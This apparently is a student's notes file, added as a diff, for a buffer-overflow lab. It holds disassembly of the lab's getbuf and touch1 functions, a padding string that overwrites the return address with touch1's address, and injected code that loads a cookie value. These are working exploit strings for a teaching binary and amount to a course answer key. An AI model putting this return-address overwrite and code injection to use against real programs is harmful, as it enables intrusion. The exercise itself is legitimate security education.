@@ -1,0 +1,35 @@
+00000000004016b0 <getbuf>:
+  4016b0:       48 83 ec 18             sub    $0x18,%rsp
+  4016b4:       48 89 e7                mov    %rsp,%rdi
+  4016b7:       e8 2e 02 00 00          callq  4018ea <Gets>
+  4016bc:       b8 01 00 00 00          mov    $0x1,%eax
+  4016c1:       48 83 c4 18             add    $0x18,%rsp
+  4016c5:       c3                      retq
+  4016c6:       66 90                   xchg   %ax,%ax
+
+00000000004016c8 <touch1>:
+  4016c8:       48 83 ec 08             sub    $0x8,%rsp
+  4016cc:       c7 05 a6 29 20 00 01    movl   $0x1,0x2029a6(%rip)        # 60407c <vlevel>
+  4016d3:       00 00 00
+  4016d6:       bf 3c 2e 40 00          mov    $0x402e3c,%edi
+  4016db:       e8 f0 f4 ff ff          callq  400bd0 <puts@plt>
+  4016e0:       bf 01 00 00 00          mov    $0x1,%edi
+  4016e5:       e8 eb 03 00 00          callq  401ad5 <validate>
+  4016ea:       bf 00 00 00 00          mov    $0x0,%edi
+  4016ef:       e8 6c f6 ff ff          callq  400d60 <exit@plt>
+
+00 00 00 00 00 00
+00 00 00 00 00 00
+00 00 00 00 00 00
+00 00 00 00 00 00
+
+c8 16 40 00 00 00 00 00 
+
+
+0000000000000000 <.text>:
+   0:   48 c7 c7 a1 0c 07 16    mov    $0x16070ca1,%rdi
+   7:   c3                      retq
+
+0x16070ca1
+
+31 36 30 37 30 63 61 31
